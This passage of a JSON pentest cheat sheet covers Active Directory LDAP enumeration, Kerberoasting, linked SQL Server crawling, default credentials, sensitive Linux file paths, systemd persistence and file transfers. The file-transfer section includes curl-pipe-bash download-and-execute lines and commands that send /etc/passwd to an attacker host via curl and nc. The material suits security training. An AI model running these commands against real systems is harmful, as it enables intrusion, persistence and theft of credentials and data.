    "steps": [
      {
        "title": "LDAP Distinguished Names (DN)",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Understanding LDAP structure:\n- **DN**: `CN=John Doe,OU=Users,DC=corp,DC=local`\n- **CN**: Common Name (user, computer, group)\n- **OU**: Organizational Unit (container)\n- **DC**: Domain Component (domain parts)",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "LDAP (Lightweight Directory Access Protocol) is the protocol used to query Active Directory.\n- **Port 389**: LDAP (unencrypted)\n- **Port 636**: LDAPS (encrypted with SSL/TLS)\n- **Port 3268**: Global Catalog (LDAP)\n- **Port 3269**: Global Catalog (LDAPS)",
        "variant": "info"
      }
    ]
  },
  {
    "category": "LDAP Enumeration",
    "title": "LDAP Enumeration",
    "tags": [
      "Active_Directory",
      "Enumeration",
      "LDAP"
    ],
    "steps": [],
    "resources": [
      {
        "text": "HackTricks LDAP",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap"
      },
      {
        "text": "PayloadsAllTheThings LDAP",
        "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#ldap"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Comprehensive LDAP enumeration techniques for Active Directory reconnaissance."
      }
    ]
  },
  {
    "category": "NetExec",
    "title": "LDAP Enumeration",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "NetExec",
      "Windows"
    ],
    "steps": [
      {
        "title": "Enumerate Users via LDAP",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DomainController> -u <Username> -p '<Password>' --users"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Groups via LDAP",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DomainController> -u <Username> -p '<Password>' --groups"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Computers via LDAP",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DomainController> -u <Username> -p '<Password>' --computers"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find Kerberoastable Users",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DomainController> -u <Username> -p '<Password>' --kerberoasting"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Automatically extracts Kerberos TGS tickets for cracking.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Find AS-REP Roastable Users",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DomainController> -u <Username> -p '<Password>' --asreproast"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Trusted Domains",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DomainController> -u <Username> -p '<Password>' --trusted-for-delegation"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Get Password Policy",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DomainController> -u <Username> -p '<Password>' --pass-pol"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "LDAP Enumeration",
    "title": "LDAP Enumeration with Impacket",
    "tags": [
      "Active_Directory",
      "Enumeration",
      "LDAP"
    ],
    "steps": [
      {
        "title": "GetADUsers.py - Enumerate Users",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-GetADUsers -all -dc-ip <DomainController> <Domain>/<Username>:'<Password>'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "GetADUsers.py - Output to File",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-GetADUsers -all -dc-ip <DomainController> <Domain>/<Username>:'<Password>' > users.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "LDAP Enumeration",
    "title": "LDAP Enumeration with NetExec",
    "tags": [
      "Active_Directory",
      "Enumeration",
      "LDAP"
    ],
    "steps": [
      {
        "title": "Enumerate Users",
        "codes": [
          {
            "lang": "bash",
            "code": "netexec ldap <DomainController> -u <Username> -p '<Password>' --users"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Groups",
        "codes": [
          {
            "lang": "bash",
            "code": "netexec ldap <DomainController> -u <Username> -p '<Password>' --groups"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Password Policy",
        "codes": [
          {
            "lang": "bash",
            "code": "netexec ldap <DomainController> -u <Username> -p '<Password>' --pass-pol"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Trusted Domains",
        "codes": [
          {
            "lang": "bash",
            "code": "netexec ldap <DomainController> -u <Username> -p '<Password>' --trusted-for-delegation"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "NetExec (formerly CrackMapExec) has built-in LDAP enumeration.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "LDAP Enumeration",
    "title": "LDAP Enumeration Workflow",
    "tags": [
      "Active_Directory",
      "Enumeration",
      "LDAP"
    ],
    "steps": [
      {
        "title": "Step 1: Test Anonymous Bind",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DomainController> -b \"DC=corp,DC=local\" \"(objectClass=user)\" sAMAccountName"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "If anonymous bind works, you can enumerate without credentials.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Step 2: Enumerate Users with windapsearch",
        "codes": [
          {
            "lang": "bash",
            "code": "python3 windapsearch.py -d <Domain> -u <Username> -p '<Password>' --dc-ip <DomainController> -U --full > users.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 3: Enumerate Computers",
        "codes": [
          {
            "lang": "bash",
            "code": "python3 windapsearch.py -d <Domain> -u <Username> -p '<Password>' --dc-ip <DomainController> -C --full > computers.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 4: Find Privileged Users",
        "codes": [
          {
            "lang": "bash",
            "code": "python3 windapsearch.py -d <Domain> -u <Username> -p '<Password>' --dc-ip <DomainController> --privileged-users"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 5: Find Kerberoastable Users",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DomainController> -D \"<Username>@<Domain>\" -w '<Password>' -b \"DC=corp,DC=local\" \"(&(objectClass=user)(servicePrincipalName=*))\" sAMAccountName servicePrincipalName"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 6: Create HTML Reports",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapdomaindump -u '<Domain>\\<Username>' -p '<Password>' <DomainController> -o /tmp/ldap_dump"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Open `domain_users.html` in a browser for easy analysis.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "LDAP Enumeration",
    "title": "ldapdomaindump - Comprehensive LDAP Dump",
    "tags": [
      "Active_Directory",
      "Enumeration",
      "LDAP"
    ],
    "steps": [
      {
        "title": "Install ldapdomaindump",
        "codes": [
          {
            "lang": "bash",
            "code": "pip3 install ldapdomaindump"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Dump Domain Information",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapdomaindump -u '<Domain>\\<Username>' -p '<Password>' <DomainController>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Creates HTML files: `domain_users.html`, `domain_computers.html`, `domain_groups.html`, etc."
          }
        ]
      },
      {
        "title": "Dump with Output Directory",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapdomaindump -u '<Domain>\\<Username>' -p '<Password>' <DomainController> -o /tmp/ldap_dump"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Dump Over LDAPS (Port 636)",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapdomaindump -u '<Domain>\\<Username>' -p '<Password>' ldaps://<DomainController> -o /tmp/ldap_dump"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "`ldapdomaindump` creates HTML reports of AD structure.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Linked SQL Server Attacks",
    "title": "Link Crawling",
    "tags": [
      "Exploitation",
      "SQL",
      "Windows"
    ],
    "steps": [
      {
        "title": "Recursive Link Enumeration",
        "codes": [
          {
            "lang": "sql",
            "code": "-- Find links from linked server\nSELECT * FROM OPENQUERY(\"<LinkedServer>\", 'SELECT * FROM sys.servers WHERE is_linked = 1')"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "PowerUpSQL Crawl",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-SQLServerLinkCrawl -Instance <Target> -Verbose"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Chain Multiple Links",
        "codes": [
          {
            "lang": "sql",
            "code": "-- Server1 -> Server2 -> Server3\nSELECT * FROM OPENQUERY(\"Server1\", 'SELECT * FROM OPENQUERY(\"Server2\", ''SELECT * FROM OPENQUERY(\"Server3\", ''''SELECT SYSTEM_USER'''')'')' )"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linked SQL Server Attacks",
    "title": "Link Security Context",
    "tags": [
      "Exploitation",
      "SQL",
      "Windows"
    ],
    "steps": [
      {
        "title": "Check Effective User",
        "codes": [
          {
            "lang": "sql",
            "code": "SELECT * FROM OPENQUERY(\"<LinkedServer>\", 'SELECT SYSTEM_USER, USER_NAME()')"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Common Link Misconfigurations",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Common misconfigurations:\n- Link configured with **sa** account\n- Link uses service account with sysadmin\n- Link impersonates connecting user (chain their privileges)",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linked SQL Server Attacks",
    "title": "Linked SQL Servers",
    "tags": [
      "Exploitation",
      "SQL",
      "Windows"
    ],
    "steps": [
      {
        "title": "Enumerate Linked Servers",
        "codes": [
          {
            "lang": "sql",
            "code": "SELECT * FROM sys.servers WHERE is_linked = 1"
          },
          {
            "lang": "sql",
            "code": "EXEC sp_linkedservers"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "PowerUpSQL Enumeration",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-SQLServerLink -Instance <Target>\nGet-SQLServerLinkCrawl -Instance <Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Check Link Privileges",
        "codes": [
          {
            "lang": "sql",
            "code": "-- Execute query on linked server\nSELECT * FROM OPENQUERY(\"<LinkedServer>\", 'SELECT SYSTEM_USER')\nSELECT * FROM OPENQUERY(\"<LinkedServer>\", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')')"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "NetSPI - SQL Server Link Crawling",
        "url": "https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-link-crawling-powerupsql/"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "SQL Server links allow queries to remote servers. Links may have different (higher) privileges than initial connection.",
        "variant": "danger"
      }
    ]
  },
  {
    "category": "Default Credentials",
    "title": "Linux Defaults",
    "tags": [],
    "steps": [
      {
        "title": "Root Account",
        "codes": [
          {
            "lang": "plaintext",
            "code": "root:root\nroot:toor\nroot:password\nroot:(blank)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Common User Accounts",
        "codes": [
          {
            "lang": "plaintext",
            "code": "admin:admin\nuser:user\nubuntu:ubuntu\ndebian:debian"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Linux Reference",
    "title": "Linux File System Structure",
    "tags": [
      "Linux"
    ],
    "steps": [
      {
        "title": "Root Directories",
        "codes": [
          {
            "lang": "text",
            "code": "/ - Anchor and root of the filesystem\n/bin - User binaries\n/boot - Boot-up related files\n/dev - Interface for system devices\n/etc - System configuration files\n/home - Base directory for user files\n/lib - Critical software libraries\n/opt - Third party software\n/proc - System and running programs\n/root - Home directory of root user\n/sbin - System administrator binaries\n/tmp - Temporary files\n/usr - Contains all system files (less critical)\n/var - Variable system files"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Core directories at the root of the Linux file system."
          }
        ]
      },
      {
        "title": "Important Files and Directories",
        "codes": [
          {
            "lang": "bash",
            "code": "# User and authentication files\n/etc/shadow           # User account info and password hashes\n/etc/passwd           # User account information\n/etc/group            # Group names\n\n# Startup and services\n/etc/rc.d             # Startup services (rc0.d-rc6.d)\n/etc/init.d           # Contains startup/stop scripts\n\n# Network configuration\n/etc/hosts            # Hardcoded hostname and IP combinations\n/etc/hostname         # Full hostname with domain\n/etc/network/interfaces  # Network configuration (Debian)\n/etc/netplan          # Network configuration (Ubuntu)\n/etc/resolv.conf      # DNS configuration\n\n# System configuration\n/etc/profile          # System environment variables\n/etc/apt/sources.list # Debian package source\n/etc/fstab            # Local and network mounts/shares\n\n# User directories\n/home/<User>/.bash_history  # User Bash history\n~/.ssh/               # SSH keystore\n\n# Logs\n/var/log              # System log files (most Linux)\n/var/adm              # System log files (Unix)\n/var/spool/cron       # List cron files\n/var/log/apache2/access.log  # Apache connection log\n\n# Misc\n/usr/share/wireshark/manuf  # Vendor-MAC lookup (Kali)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Critical files for enumeration and post-exploitation."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Linux Filesystem Hierarchy",
        "url": "https://www.pathname.com/fhs/"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Reference for standard Linux file system hierarchy and important directories."
      }
    ]
  },
  {
    "category": "File Transfer Techniques",
    "title": "Linux File Transfers",
    "tags": [],
    "steps": [
      {
        "title": "Download from Kali",
        "codes": [
          {
            "lang": "bash",
            "code": "# wget\nwget http://<KaliIP>/file.sh\n\n# curl\ncurl http://<KaliIP>/file.sh -o file.sh\ncurl http://<KaliIP>/file.sh > file.sh\n\n# Download and execute\ncurl http://<KaliIP>/script.sh | bash\nwget -O - http://<KaliIP>/script.sh | bash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Upload to Kali",
        "codes": [
          {
            "lang": "bash",
            "code": "# Using curl\ncurl -X POST -F \"file=@/etc/passwd\" http://<KaliIP>/upload\n\n# Using nc\nnc <KaliIP> 4444 < /etc/passwd"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Using SCP",
        "codes": [
          {
            "lang": "bash",
            "code": "# Upload to Kali\nscp file.txt user@<KaliIP>:/tmp/\n\n# Download from Kali\nscp user@<KaliIP>:/opt/tools/file.sh /tmp/"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Important File Locations",
    "title": "Linux Important Locations",
    "tags": [],
    "steps": [
      {
        "title": "User and Authentication",
        "codes": [
          {
            "lang": "plaintext",
            "code": "/etc/passwd\n/etc/shadow\n/etc/groups\n/etc/npasswd"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "System Configuration",
        "codes": [
          {
            "lang": "plaintext",
            "code": "/etc/issue\n/etc/lsb-release\n/etc/motd\n/etc/hosts\n/etc/hosts.allow\n/etc/hosts.deny\n/etc/hostname\n/etc/network/interfaces\n/etc/networks\n/etc/resolv.conf\n/etc/fstab\n/etc/mtab"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Boot and Kernel",
        "codes": [
          {
            "lang": "plaintext",
            "code": "/etc/grub.conf\n/etc/lilo.conf\n/etc/inittab\n/proc/version\n/proc/cmdline\n/proc/cpuinfo\n/proc/meminfo\n/proc/modules\n/proc/mounts\n/proc/filesystems\n/proc/interrupts\n/proc/ioports\n/proc/stat\n/proc/swaps"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Scheduled Tasks",
        "codes": [
          {
            "lang": "plaintext",
            "code": "/etc/crontab\n/etc/anacrontab\n/etc/cron.allow\n/etc/cron.deny\n/var/spool/cron/crontabs/root"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Apache/Web Server",
        "codes": [
          {
            "lang": "plaintext",
            "code": "/etc/apache2/apache2.conf\n/etc/apache2/httpd.conf\n/etc/apache2/sites-enabled/000-default.conf\n/etc/httpd/access.conf\n/etc/httpd/conf/httpd.conf\n/etc/httpd/httpd.conf\n/etc/httpd/srm.conf\n/etc/lighttpd.conf\n/usr/local/apache/conf/modsec.conf\n/usr/local/apache/conf/php.ini\n/usr/local/etc/httpd/logs/access_log\n/usr/local/etc/httpd/logs/error_log"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "PHP Configurations",
        "codes": [
          {
            "lang": "plaintext",
            "code": "/etc/php.ini\n/etc/php/php.ini\n/etc/php/apache/php.ini\n/etc/php/apache2/php.ini\n/etc/php/cgi/php.ini\n/etc/php4/apache/php.ini\n/etc/php4/apache2/php.ini\n/etc/php4/cgi/php.ini\n/etc/php4.4/fcgi/php.ini\n/etc/php5/apache/php.ini\n/etc/php5/apache2/php.ini\n/usr/lib/php.ini\n/usr/lib/php/php.ini\n/usr/local/etc/php.ini\n/usr/local/lib/php.ini"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "MySQL/Database",
        "codes": [
          {
            "lang": "plaintext",
            "code": "/etc/my.cnf\n/etc/my.conf\n/etc/mysql/my.cnf\n/var/lib/mysql/my.cnf\n/var/lib/mysql/mysql/user.MYD"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "FTP Servers",
        "codes": [
          {
            "lang": "plaintext",
            "code": "/etc/ftpaccess\n/etc/ftpchroot\n/etc/ftphosts\n/etc/ftpusers\n/etc/pure-ftpd.conf\n/etc/pure-ftpd/pure-ftpd.conf\n/etc/pure-ftpd/pure-ftpd.pdb\n/etc/pureftpd.passwd\n/etc/pureftpd.pdb\n/etc/proftp.conf\n/etc/proftpd/proftpd.conf\n/etc/vhcs2/proftpd/proftpd.conf\n/etc/vsftpd.conf\n/etc/vsftpd/vsftpd.conf\n/etc/vsftpd.chroot_list\n/etc/wu-ftpd/ftpaccess\n/etc/wu-ftpd/ftphosts\n/etc/wu-ftpd/ftpusers\n/usr/etc/pure-ftpd.conf\n/usr/local/etc/pure-ftpd.conf\n/usr/local/etc/pureftpd.pdb\n/usr/local/pureftpd/etc/pure-ftpd.conf\n/usr/local/pureftpd/etc/pureftpd.pdn\n/usr/local/pureftpd/sbin/pure-config.pl\n/usr/sbin/pure-config.pl"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "SSH Configuration",
        "codes": [
          {
            "lang": "plaintext",
            "code": "/etc/ssh/ssh_config\n/etc/ssh/sshd_config\n/etc/ssh/ssh_host_dsa_key\n/etc/ssh/ssh_host_dsa_key.pub\n/etc/ssh/ssh_host_key\n/etc/ssh/ssh_host_key.pub\n~/.ssh/authorized_keys\n~/.ssh/id_dsa\n~/.ssh/id_dsa.pub\n~/.ssh/id_rsa\n~/.ssh/id_rsa.pub\n~/.ssh/id_edcsa\n~/.ssh/identity\n~/.ssh/identity.pub"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Samba",
        "codes": [
          {
            "lang": "plaintext",
            "code": "/etc/samba/smb.conf"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "System Logs",
        "codes": [
          {
            "lang": "plaintext",
            "code": "/var/log/auth.log\n/var/log/boot\n/var/log/daemon.log\n/var/log/debug\n/var/log/dmesg\n/var/log/dpkg.log\n/var/log/faillog\n/var/log/kern.log\n/var/log/lastlog\n/var/log/mail.info\n/var/log/mail.log\n/var/log/mail.warn\n/var/log/maillog\n/var/log/message\n/var/log/messages\n/var/log/secure\n/var/log/syslog\n/var/log/wtmp\n/var/log/yum.log\n/var/run/utmp"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Apache Logs",
        "codes": [
          {
            "lang": "plaintext",
            "code": "/var/log/apache/access.log\n/var/log/apache/error.log\n/var/log/apache2/access.log\n/var/log/apache2/access_log\n/var/log/apache2/error.log\n/var/log/apache2/error_log\n/var/log/apache-ssl/access.log\n/var/log/apache-ssl/error.log\n/var/log/httpd/access.log\n/var/log/httpd/access_log\n/var/log/httpd/error.log\n/var/log/httpd/error_log\n/var/log/httpd-access.log\n/var/log/httpsd/ssl.access_log\n/var/log/httpsd/ssl_log\n/usr/local/apache/log\n/usr/local/apache/logs\n/usr/local/apache/logs/access_log\n/usr/local/apache/logs/access.log\n/usr/local/apache/audit_log\n/usr/local/apache/error_log\n/usr/local/apache/error.log"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Other Service Logs",
        "codes": [
          {
            "lang": "plaintext",
            "code": "/var/log/chttp.log\n/var/log/cups/error.log\n/var/log/exim_mainlog\n/var/log/exim/mainlog\n/var/log/exim_paniclog\n/var/log/exim.paniclog\n/var/log/exim_rejectlog\n/var/log/exim/rejectlog\n/var/log/ftp-proxy\n/var/log/ftp-proxy/ftp-proxy.log\n/var/log/ftplog\n/var/log/lighttpd/access.log\n/var/log/lighttpd/error.log\n/var/log/lighttpd/lighttpd.access.log\n/var/log/lighttpd/lighttpd.error.log\n/var/log/mysqlderror.log\n/var/log/mysql.log\n/var/log/mysql/mysql-bin.log\n/var/log/mysql/mysql.log\n/var/log/mysql/mysql-slow.log\n/var/log/proftpd\n/var/log/pureftpd.log\n/var/log/pure-ftpd/pure-ftpd.log\n/var/log/vsftpd.log\n/var/log/xferlog\n/var/mysql.log\n/logs/pure-ftpd.log\n/logs/security_debug_log\n/logs/security_log"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "cPanel Logs",
        "codes": [
          {
            "lang": "plaintext",
            "code": "/usr/local/cpanel/logs\n/usr/local/cpanel/logs/access_log\n/usr/local/cpanel/logs/error_log\n/usr/local/cpanel/logs/license_log\n/usr/local/cpanel/logs/login_log\n/usr/local/cpanel/logs/stats_log"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Web Application Files",
        "codes": [
          {
            "lang": "plaintext",
            "code": "/var/www/html/__init__.py\n/var/www/html/db_connect.php\n/var/www/html/utils.php\n/var/www/log/access_log\n/var/www/log/error_log\n/var/www/logs/access_log\n/var/www/logs/access.log\n/var/www/logs/error_log\n/var/www/logs/error.log"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "XAMPP (Linux)",
        "codes": [
          {
            "lang": "plaintext",
            "code": "/opt/lampp/etc/httpd.conf\n/opt/xampp/etc/php.ini"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "User History Files",
        "codes": [
          {
            "lang": "plaintext",
            "code": "~/.bash_history\n~/.bash_logout\n~/.bash_profile\n~/.bashrc\n~/.atfp_history\n~/.mysql_history\n~/.nano_history\n~/.php_history\n~/.profile\n~/.viminfo\n~/.login\n~/.logout"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "X Window System",
        "codes": [
          {
            "lang": "plaintext",
            "code": "~/.gtkrc\n~/.wm_style\n~/.Xdefaults\n~/.xinitrc\n~/.Xresources\n~/.xsession"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Process Information",
        "codes": [
          {
            "lang": "plaintext",
            "code": "/proc/self/cwd/app.py\n/proc/self/environ\n/proc/self/net/arp\n/proc/<pid>/cmdline\n/proc/<pid>/maps\n/proc/sched_debug\n/proc/net/arp\n/proc/net/tcp\n/proc/net/udp"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Other Configuration Files",
        "codes": [
          {
            "lang": "plaintext",
            "code": "/etc/aliases\n/etc/bashrc\n/etc/bootptab\n/etc/chrootUsers\n/etc/chttp.conf\n/etc/cups/cupsd.conf\n/etc/exports\n/etc/inetd.conf\n/etc/knockd.conf\n/etc/logrotate.d/ftp\n/etc/logrotate.d/proftpd\n/etc/logrotate.d/vsftpd.log\n/etc/modules.conf\n/etc/printcap\n/etc/profile\n/etc/snmpd.conf\n/etc/sysconfig/network\n/etc/syslog.conf\n/etc/termcap\n/var/adm/log/xferlog\n/var/apache2/config.inc\n/var/cpanel/cpanel.config\n/var/local/www/conf/php.ini\n/var/webmin/miniserv.log"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "RedHat Specific",
        "codes": [
          {
            "lang": "plaintext",
            "code": "/etc/redhat-release\n/root/anaconda-ks.cfg"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Linux Privilege Escalation",
    "title": "Linux Privilege Escalation",
    "tags": [
      "Linux",
      "Post_Exploitation",
      "Privilege_Escalation"
    ],
    "steps": [],
    "resources": [
      {
        "text": "GTFOBins",
        "url": "https://gtfobins.github.io/"
      },
      {
        "text": "HackTricks Linux PrivEsc",
        "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Comprehensive Linux privilege escalation methodology."
      }
    ]
  },
  {
    "category": "Linux Persistence",
    "title": "Linux Service Persistence",
    "tags": [
      "Linux",
      "Persistence"
    ],
    "steps": [
      {
        "title": "Create Service File",
        "codes": [
          {
            "lang": "bash",
            "code": "nano /etc/systemd/system/<ServiceName>.service"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Service File Contents",
        "codes": [
          {
            "lang": "ini",
            "code": "[Unit]\nAfter=network.target\nDescription=My Service description\n\n[Service]\nType=simple\nRestart=always\nExecStart=<FullPathToScript>\n\n[Install]\nWantedBy=multi-user.target"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Add the following content to the service file. Replace `<FullPathToScript>` with the full path to the .sh file to execute on startup."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "When done editing with nano, press CTRL+X, then press 'Y', then press 'Enter' to save and close."
          }
        ]
      },
      {
        "title": "Enable and Start Service",
        "codes": [
          {
            "lang": "bash",
            "code": "# Reload service manager\nsystemctl daemon-reload\n\n# Enable the service to start on boot\nsystemctl enable <ServiceName>.service\n\n# Start the service immediately\nsystemctl start <ServiceName>.service"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Create a systemd service for persistent execution."
      }
    ]
  },
  {
    "category": "User Management Commands",
    "title": "Linux User Management",
    "tags": [],
    "steps": [
      {
        "title": "Adding Users",
        "substeps": [
          {
            "title": "Using adduser (Interactive)",
            "codes": [
              {
                "lang": "bash",
                "code": "adduser <username>"
              },
              {
                "lang": "bash",
                "code": "# Example\nsudo adduser hacker\n# Enter password when prompted"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Using useradd (Non-Interactive)",
            "codes": [
              {
                "lang": "bash",
                "code": "useradd <username>"
              },
              {
                "lang": "bash",
                "code": "# Create user with home directory\nuseradd -m <username>\n\n# Create user with specific shell\nuseradd -m -s /bin/bash <username>\n\n# Set password\npasswd <username>"
              }
            ],
            "optional": false,
